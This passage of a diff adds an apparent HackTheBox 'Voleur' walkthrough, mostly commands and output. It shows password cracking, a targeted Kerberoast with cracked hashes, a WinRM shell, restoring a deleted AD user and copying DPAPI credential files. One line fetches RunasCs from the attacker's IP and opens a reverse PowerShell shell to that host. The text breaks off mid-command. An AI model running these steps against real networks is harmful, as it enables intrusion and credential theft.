successfully.</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have a <code>Access_review.xslx</code> file, lets crack its password:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/…/nxc_spider_plus/dc.voleur.htb/IT/First-Line Support]</span><br><span class="line">└─$ office2john Access_Review.xlsx &gt; hash.xslx</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/…/nxc_spider_plus/dc.voleur.htb/IT/First-Line Support]</span><br><span class="line">└─$ john  --wordlist=/usr/share/wordlists/rockyou.txt hash.xslx          </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])</span><br><span class="line">Cost 1 (MS Office version) is 2013 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 100000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">football1        (Access_Review.xlsx)     </span><br><span class="line">1g 0:00:00:02 DONE (2025-07-10 13:45) 0.3759g/s 294.7p/s 294.7c/s 294.7C/s football1..lolita</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Voleur/xslx.png"
+                      alt="Excel file"
+                ><figcaption>Excel file</figcaption></figure></p>
+<p>We can see we have access to some user credentials.<br>Lets use them to perform a targeted kerberoast attack:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ python3 targetedKerberoast.py -v -d <span class="string">&#x27;voleur.htb&#x27;</span> --dc-host dc.voleur.htb -u <span class="string">&#x27;svc_ldap&#x27;</span> -p <span class="string">&#x27;M1XyC9pW7qT5Vn&#x27;</span> -k</span><br><span class="line">[*] Starting kerberoast attacks</span><br><span class="line">[*] Fetching usernames from Active Directory with LDAP</span><br><span class="line">[VERBOSE] SPN added successfully <span class="keyword">for</span> (lacey.miller)</span><br><span class="line">[+] Printing <span class="built_in">hash</span> <span class="keyword">for</span> (lacey.miller)</span><br><span class="line">$krb5tgs$23$*lacey.miller<span class="variable">$VOLEUR</span>.HTB<span class="variable">$voleur</span>.htb/lacey.miller*$a24aca83fd617c6ffc7d9884128db09a<span class="variable">$89061fb2e1e4d276d1cc3cdea442a3879ebb1a9ea1e9d1cbe57a8c48fe66e9e056fcf5bb025cb4c4756c672f75cd6ac3d12783deb82ac3129b8b6c8ab4444ec720ee18f59c58704208d51f5add36ffea68377afc808ab6bedd1eb835c79177663167a1a6eb822fdffdf77a473bee5a6f39039abd96b3faf3a82c4a65f887763e55ab0ddfb94e9ce6a8ef21478cc9198ea41bc084e0714786e762a22f3aff699146faaae20847b49c57f9d158795581d4b7ea9ba742a407a9a048e17744b254e8d1dca50984ae3179cede1f27ce20217b66c2875b29154ac99708cd575e11269b2103283510c9dab4cbc0853383047feab8f1c6dbff521b0c50412f47cbfd97b4828b0be58912a04fc064ce16bdecfb80c986b25e06ef8a955884d918291257b62de4c56c41f61e7aa68362b557a74e03255fe1ef0bfc00865c1ba3f8fe527841c139d0882fc897e0b017cedf99a7247a466733d2ec33fc4d597642f371d66a8139e21e137f0d58ecfe01a6cb31400368b58b58b5bdeb09a8602e4cce2009aeb5cc275e2c813a928f65dd3ab1aa119ce915eb6167c62a936324b32a1cb01f46d2eccb9579a8de02543671bb57876868e9f21e9a2234f01035b12626d4da148e9fbcbff1add377d3314819924b58f4db3c3bb5f36a9205553cf782aa590e9ba9e24cd35821048210a93595beee45cbf7fafbb1374f672d82a0d9cf1c549e683fc38d52ab98df281f027bc4ed5db96165e71bfe75ee5c10e7a086fa6a029ec754aab3c75e42ec107ee056b74bfcd68a9a6f8b5aee37c240601f82bea8f0887d628a36881113eca45170bb69d730b1a374e80d0448504d23b39362f4d10f403a9e87cbae7c9c4774dfc06049e850e8a0bafd84b564e5d230773f6ba50fb8ca7d4e4cec162eeaa41b77d660085b22927cf01aa86f7fd212a4db49656a34d0c946ac01f8e6a694e136d1cb4c590fa5755780b55801b66710e2b3c95d858d7a59d4d89b81422c1b287edf03504c54ac46ed0fbd6c09c3d0e8c389dedc00c765d9a8a2624cb8e6557410e1055f898a8839f84e291cde66c699cfd3a8d680b51549f1bc93f836feec8fb3ad6d08ffb3d292ceefcd569ac3d1fb604bf38c930575fd124cc5e62f16b65da99230f48412a178e594d92b72d45844913f773259aef3951417e2bb55b1f09d7415368b86cc62d4b5eefe29957817e8655e1337c50cb5d568b50a0ff0c609d5db1c0b0f431fb3168003c91f99f02e16f11857f7193cea737baae14439fe219d486d45eb31f9a8908af641e70fd5ecfa6fe5281018bbd7f8d3ee6284e262b7e9091f3583aba49fb81f76db4fe70029255ab7b233ec96c9c389711438bb017ec7c602c8cad137f9ecb34a81a78ba336dcdaf287c20616da7e4a01eff9d69654466260a1b05d706ddf31801b612d37eaf5fdb086c5b3f93e5b3b592aff715875e0120a3a09d0aba4fc2bfa751b42d8</span></span><br><span class="line">[VERBOSE] SPN removed successfully <span class="keyword">for</span> (lacey.miller)</span><br><span class="line">[VERBOSE] SPN added successfully <span class="keyword">for</span> (svc_winrm)</span><br><span class="line">[+] Printing <span class="built_in">hash</span> <span class="keyword">for</span> (svc_winrm)</span><br><span class="line">$krb5tgs$23$*svc_winrm<span class="variable">$VOLEUR</span>.HTB<span class="variable">$voleur</span>.htb/svc_winrm*$9a331e767c9e6482b00a459019f0d3c4<span class="variable">$d1bb120cef34c0a8d7c50f7823ac96284067fd49bcea95ceb4f44eb4dc0e90d31ea112fa6f60087d4a37277f48b796c637f90f8f3cc2b0d86d108472773a1fe328a389dedb2a91257829fb682e0a328ebaac4d3e6ab4506f8e0e5a95fa164d371742a7fc6d316d22b5e304f13a7463df6e771a66fd377a6169b00cd4e65f0095ec2b0b459693d2e82967652176103d9716592267241316bbda691c7f9e92c4f54430b4fb9665e534d383d6ffa186622869383559395fb655065c6b0b8999e91d95f01cccaa1c65ac9117c28bbf1402f14e65adc015620ef76b5069967c77d8c9370d8ac316c16fe0d93ce0b862249d43f91a339a9a5f690424316c4e7c7adfc4695a4e1d36b6cf7ac993ba1f33baff59cb9f0a2800b2bed43d2c4c9ed32f89ecb051b16d999ef02bd30750066a2a3b91b1a9b206c72fb630dedf84bdb2bdae7c4b3b06d655208617c211ee6c3a279d2e94bfd9bb2df219394ef163957f86e03edf7f1df5ea2c33a357907c8ff6332c34566512e26c70a7a32cbb9424892056ad3ffbfd7129e69f8878f49d36191f8123cf71009f71fedfadfe9760183824046fa6c952aaf97571f8b9ff1683fb4a41d9020b5f90e28991641e776756f8de2bd1d5901382dc042097d411b3ab9dadfa7e8b7b2b646f91869b8616ab088ed2fe8522e7ed490c287be4576a8ae2525f2218b37b2f64c258628c884f32220e4659e4ab58ea79b5072e01f49aaec535382728dc69e688acb25adbe44bba40218e325d7b7fdd22904a0ec6d1d967fba92c83bc273032931c3937f870ca6ffb3e30d8a674a712d8f8c5eb2e8292474eb424136091590fe8bb1fec45862fcc0cc975b4be580df384df54913cfcc88b0d4dc3e158f68cd3641a2f338e69d86e70c86e8138dfcac86eea44494e9527df3e88f54216c0cf7e080ada504bf28105d4b73c72ac745ae720be32eef6672e5c4077c4d97325405d0d65d2697e0156c82b38e1d517046f6d23e74122be4be67c5232b89795c2937a7aaec260aa8f89f36e0a9f50a84300f05169c22356a78ac995c4c8b8ca4232e74a1787c011272c60f5aaf94d6e33f965d766fe8a258315a647a0b93f8446eb04ca06beffdea80817345cfb81334aac9f2a447932456d9d2bf3533c81ad9d9cd94f9cd653afe4215750aa0b7f23f3c0a4ab93166ace6ad2a719e39a3be1c81b92950d9e1d500e4b7dbbc9819ee7e54f2465b5d1103ea7184a9c7b6ff8fadd5876d798ea16a140f2064e1b8befdf6f364dfa67c5ccf1740b039694661b87655f051ae9d6facc5fc796acdde9591c9c8cd07f908253bffd171137f02a7e402d914846198765f2051472801caf08c53dc6523ea113133fa6bb0662ccc595ebf47b1e3aa39049ba8acc5791e5cd6d1e5158ad4eaff1201714b2cd1a8304c1c58e810c353103ee3e28b8445470732e42265075f98cd805fb736da2a0f1d6ef0709ff7b</span></span><br><span class="line">[VERBOSE] SPN removed successfully <span class="keyword">for</span> (svc_winrm)</span><br></pre></td></tr></table></figure></div>
+
+<p>We indeed have a few hashes to crack:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&#x27;$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$9a331e767c9e6482b00a459019f0d3c4$d1bb120cef34c0a8d7c50f7823ac96284067fd49bcea95ceb4f44eb4dc0e90d31ea112fa6f60087d4a37277f48b796c637f90f8f3cc2b0d86d108472773a1fe328a389dedb2a91257829fb682e0a328ebaac4d3e6ab4506f8e0e5a95fa164d371742a7fc6d316d22b5e304f13a7463df6e771a66fd377a6169b00cd4e65f0095ec2b0b459693d2e82967652176103d9716592267241316bbda691c7f9e92c4f54430b4fb9665e534d383d6ffa186622869383559395fb655065c6b0b8999e91d95f01cccaa1c65ac9117c28bbf1402f14e65adc015620ef76b5069967c77d8c9370d8ac316c16fe0d93ce0b862249d43f91a339a9a5f690424316c4e7c7adfc4695a4e1d36b6cf7ac993ba1f33baff59cb9f0a2800b2bed43d2c4c9ed32f89ecb051b16d999ef02bd30750066a2a3b91b1a9b206c72fb630dedf84bdb2bdae7c4b3b06d655208617c211ee6c3a279d2e94bfd9bb2df219394ef163957f86e03edf7f1df5ea2c33a357907c8ff6332c34566512e26c70a7a32cbb9424892056ad3ffbfd7129e69f8878f49d36191f8123cf71009f71fedfadfe9760183824046fa6c952aaf97571f8b9ff1683fb4a41d9020b5f90e28991641e776756f8de2bd1d5901382dc042097d411b3ab9dadfa7e8b7b2b646f91869b8616ab088ed2fe8522e7ed490c287be4576a8ae2525f2218b37b2f64c258628c884f32220e4659e4ab58ea79b5072e01f49aaec535382728dc69e688acb25adbe44bba40218e325d7b7fdd22904a0ec6d1d967fba92c83bc273032931c3937f870ca6ffb3e30d8a674a712d8f8c5eb2e8292474eb424136091590fe8bb1fec45862fcc0cc975b4be580df384df54913cfcc88b0d4dc3e158f68cd3641a2f338e69d86e70c86e8138dfcac86eea44494e9527df3e88f54216c0cf7e080ada504bf28105d4b73c72ac745ae720be32eef6672e5c4077c4d97325405d0d65d2697e0156c82b38e1d517046f6d23e74122be4be67c5232b89795c2937a7aaec260aa8f89f36e0a9f50a84300f05169c22356a78ac995c4c8b8ca4232e74a1787c011272c60f5aaf94d6e33f965d766fe8a258315a647a0b93f8446eb04ca06beffdea80817345cfb81334aac9f2a447932456d9d2bf3533c81ad9d9cd94f9cd653afe4215750aa0b7f23f3c0a4ab93166ace6ad2a719e39a3be1c81b92950d9e1d500e4b7dbbc9819ee7e54f2465b5d1103ea7184a9c7b6ff8fadd5876d798ea16a140f2064e1b8befdf6f364dfa67c5ccf1740b039694661b87655f051ae9d6facc5fc796acdde9591c9c8cd07f908253bffd171137f02a7e402d914846198765f2051472801caf08c53dc6523ea113133fa6bb0662ccc595ebf47b1e3aa39049ba8acc5791e5cd6d1e5158ad4eaff1201714b2cd1a8304c1c58e810c353103ee3e28b8445470732e42265075f98cd805fb736da2a0f1d6ef0709ff7b&#x27;</span> &gt; winrm.hash</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ john  --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt winrm.hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">AFireInsidedeOzarctica980219afi (?)     </span><br><span class="line">1g 0:00:00:03 DONE (2025-07-10 13:53) 0.2915g/s 3344Kp/s 3344Kc/s 3344KC/s AHANACK6978012..AFITA4162</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+
+<p>We will now connect using this winrm service account user and claim user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ getTGT.py voleur.htb/<span class="string">&#x27;svc_winrm&#x27;</span>:<span class="string">&#x27;AFireInsidedeOzarctica980219afi&#x27;</span> -dc-ip dc.voleur.htb</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> svc_winrm.ccache</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=svc_winrm.ccache </span><br><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ evil-winrm -i dc.voleur.htb -r VOLEUR.HTB</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                                         </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                                                           </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_winrm\Documents&gt; <span class="built_in">cd</span> ../desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_winrm\desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">f28cf8c8fc8f586ddbda4eb728467e34</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-ACL-abuse"><a href="#Privilege-Escalation-ACL-abuse" class="headerlink" title="Privilege Escalation - ACL abuse"></a>Privilege Escalation - ACL abuse</h2><p>we can see from bloodhound capture that svc_ldap user is a member of RESTORE_USER group which has genericAll on lacy user:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Voleur/blood.png"
+                      alt="Bloodhound"
+                ><figcaption>Bloodhound</figcaption></figure></p>
+<p>Lets first switch to svc_ldap user using RunasCs since we have his credentials:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_winrm\Documents&gt; iwr 10.10.16.11/RunasCs.exe -outfile r.exe;./r.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.16.11:4444</span><br><span class="line">[*] Warning: The logon <span class="keyword">for</span> user <span class="string">&#x27;svc_ldap&#x27;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class="string">&#x27;8&#x27;</span> to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line">[+] Running <span class="keyword">in</span> session 0 with process <span class="keyword">function</span> CreateProcessWithLogonW()</span><br><span class="line">[+] Using Station\Desktop: Service-0x0-1e701f$\Default</span><br><span class="line">[+] Async process <span class="string">&#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27;</span> with pid 5320 created <span class="keyword">in</span> background.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ rlwrap nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.11] from (UNKNOWN) [10.10.11.76] 59234</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Install the latest PowerShell <span class="keyword">for</span> new features and improvements! https://aka.ms/PSWindows</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">voleur\svc_ldap</span><br><span class="line">PS C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>First we can check the deleted users where we will find todd. Let’s restore him:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; Get-ADObject -Filter <span class="string">&#x27;isDeleted -eq $true&#x27;</span> -IncludeDeletedObjects</span><br><span class="line">Get-ADObject -Filter <span class="string">&#x27;isDeleted -eq $true&#x27;</span> -IncludeDeletedObjects</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Deleted           : True</span><br><span class="line">DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb</span><br><span class="line">Name              : Deleted Objects</span><br><span class="line">ObjectClass       : container</span><br><span class="line">ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8</span><br><span class="line"></span><br><span class="line">Deleted           : True</span><br><span class="line">DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb</span><br><span class="line">Name              : Todd Wolfe</span><br><span class="line">                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; Restore-ADObject -Identity <span class="string">&#x27;1c6b1deb-c372-4cbb-87b1-15031de169db&#x27;</span></span><br><span class="line">Restore-ADObject -Identity <span class="string">&#x27;1c6b1deb-c372-4cbb-87b1-15031de169db&#x27;</span></span><br><span class="line">PS C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We can then also connect as todd:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_winrm\Documents&gt; ./r.exe Todd.Wolfe NightT1meP1dg3on14 powershell.exe -r 10.10.16.11:</span><br><span class="line">[*] Warning: The logon <span class="keyword">for</span> user <span class="string">&#x27;Todd.Wolfe&#x27;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class="string">&#x27;8&#x27;</span> to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line">[+] Running <span class="keyword">in</span> session 0 with process <span class="keyword">function</span> CreateProcessWithLogonW()</span><br><span class="line">[+] Using Station\Desktop: Service-0x0-1e701f$\Default</span><br><span class="line">[+] Async process <span class="string">&#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27;</span> with pid 4980 created <span class="keyword">in</span> background.</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_winrm\Documents&gt; </span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ rlwrap nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.11] from (UNKNOWN) [10.10.11.76] 59252</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Install the latest PowerShell <span class="keyword">for</span> new features and improvements! https://aka.ms/PSWindows</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">voleur\todd.wolfe</span><br><span class="line">PS C:\Windows\system32&gt; </span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Dpapi-Abuse"><a href="#Dpapi-Abuse" class="headerlink" title="Dpapi Abuse"></a>Dpapi Abuse</h2><p>We can then download todd’s masterkey and credentials to dump dpapi:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\credentials&gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\credentials</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                 </span><br><span class="line">----                 -------------         ------ ----                                                                 </span><br><span class="line">-a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3                                     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\credentials&gt; <span class="built_in">cd</span> ../protect;get-childitem -force</span><br><span class="line"><span class="built_in">cd</span> ../protect;get-childitem -force</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\protect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                 </span><br><span class="line">----                 -------------         ------ ----                                                                 </span><br><span class="line">d---s-         1/29/2025   7:13 AM                S-1-5-21-3927696377-1337352550-2781715495-1110                       </span><br><span class="line">-a-hs-         1/29/2025   4:53 AM             24 CREDHIST                                                             </span><br><span class="line">-a-hs-         1/29/2025   4:53 AM             76 SYNCHIST                                                             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\protect&gt; </span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110&gt; <span class="built_in">cp</span> <span class="string">&quot;08949382-134f-4c63-b93c-ce52efc0aa88&quot;</span> c:/temp</span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;08949382-134f-4c63-b93c-ce52efc0aa88&quot;</span> c:/temp</span><br><span class="line">PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110&gt; <span class="built_in">cd</span> ../../credentials</span><br><span class="line"><span class="built_in">cd</span> ../../credentials</span><br><span class="line">PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\credentials&gt; <span class="built_in">cp</span> <span class="string">&quot;772275FAD58525253490A9B0039791D3&quot;</span> c:/temp</span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;772275FAD58525253490A9B0039791D3&quot;</span> c:/temp</span><br><span class="line">PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\credentials&gt; </span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; download 772275FAD58525253490A9B0039791D3</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\temp\772275FAD58525253490A9B0039791D3 to 772275FAD58525253490A9B0039791D3</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; download 08949382-134f-4c63-b93c-ce52efc0aa88</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\temp\08949382-134f-4c63-b93c-ce52efc0aa88 to 08949382-134f-4c63-b93c-ce52efc0aa88</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ impacket-dpapi masterkey 